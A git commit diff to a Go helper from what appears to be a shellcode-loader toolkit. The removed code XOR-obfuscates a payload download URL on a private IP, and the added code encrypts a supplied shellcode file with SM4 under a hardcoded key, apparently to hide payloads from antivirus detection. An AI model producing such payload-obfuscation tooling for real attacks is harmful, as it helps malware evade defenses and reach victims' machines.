9c9649ded44ac0a669cf90d7b1515101fb8053a7
赵公子 <zha0gongz1@protonmail.com>
2022-05-07 19:18:27 +0800

    Update encryption method
    Update encryption method

--- encryptUrl/encryptUrl.go
+++ encryptUrl/encryptUrl.go
@@ -2,25 +2,24 @@ package main
 
 import (
 	"fmt"
-	"strconv"
+	"golang.org/x/gmsm/sm4"
+	"io/ioutil"
+	"os"
 )
 
-var XorKey []byte = []byte{0x32, 0x34, 0x85, 0x6A, 0xA3, 0xFF, 0xF4, 0x7B}
-var result string
-
 func main() {
-	j := 0
-	s := ""
-	src := "http://10.10.99.190:8080/payload.bin"
-	bt := []rune(src)
-	for i := 0; i < len(bt); i++ {
-		s = strconv.FormatInt(int64(byte(bt[i])^XorKey[j]), 16)
-		if len(s) == 1 {
-			s = "0" + s
-		}
-		result = result + (s)
-		j = (j + 1) % 8
-	}
-	fmt.Println(result)
 
+	key := []byte("douknowwhoami?dr") // 自定义16位密钥
+	if len(os.Args) < 2 {
+		fmt.Println("Please select a shellcode file. (E.g.: encrypt payload.bin)")
+		return
+	}
+	filename := os.Args[1]
+	payload, err := ioutil.ReadFile(filename)
+	if err == nil {
+		fmt.Println("[+]成功加密，文件已生成...")
+	}
+
+	ecbDec, err := sm4.Sm4Ecb(key, payload, true) //sm4Ecb模式pksc7填充加密
+	ioutil.WriteFile("zha0gongz1", ecbDec, 0644)
 }
